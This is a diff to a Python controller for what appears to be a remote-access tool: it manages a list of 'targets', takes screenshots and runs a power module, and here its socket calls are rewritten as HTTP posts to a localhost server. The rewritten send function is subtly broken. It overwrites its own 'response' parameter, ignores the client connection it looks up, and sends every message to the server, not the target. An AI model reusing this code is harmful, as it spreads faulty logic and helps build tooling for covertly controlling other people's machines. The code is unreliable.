@@ -1,5 +1,5 @@
 from datetime import datetime
-from socket import error as socket_error
+import requests
 from os import makedirs, path
 
 # Consts
@@ -7,7 +7,7 @@ BUFFER_SIZE = 1024
 POWER_MODULE_COOLDOWN = 5  # Minutes
 SCREENSHOT_COOLDOWN = 0.5  # Minutes
 UPDATE_TABLE_COOLDOWN = 3000  # Milliseconds
-SERVER = None
+SERVER = 'http://localhost:8000'  # Change the server address to match your server's address
 WIN = None
 
 # Server Variables
@@ -26,15 +26,15 @@ def send_to_client(target, message, response=True, as_bytes=False):
     """
     try:
         conn = client_list[target]['data']['socket']
-        SERVER.send(conn, message)
-        if response is True:
-            server_response = SERVER.receive(conn, as_bytes)
+        response = requests.post(SERVER, data=message)
+        if response.status_code == 200:
+            server_response = response.content
             if server_response is None:
                 delete_client(target)
                 return ''
             return server_response
-    except socket_error as e:
-        log('Error: ' + str(e))
+    except requests.exceptions.RequestException as e:
+        print('Error: ' + str(e))
         delete_client(target)
         if response is True:
             return ''
@@ -45,7 +45,7 @@ def delete_client(target):
     Deletes a target from the client list. Should be used when a client is dead.
     :param target: Number of client
     """
-    log('Connection to client #{} was lost... Removing client...'.format(target + 1))
+    print('Connection to client #{} was lost... Removing client...'.format(target + 1))
     client_list[target]['data']['socket'].close()
     client_list.pop(target)  # Delete dead client from the list
 
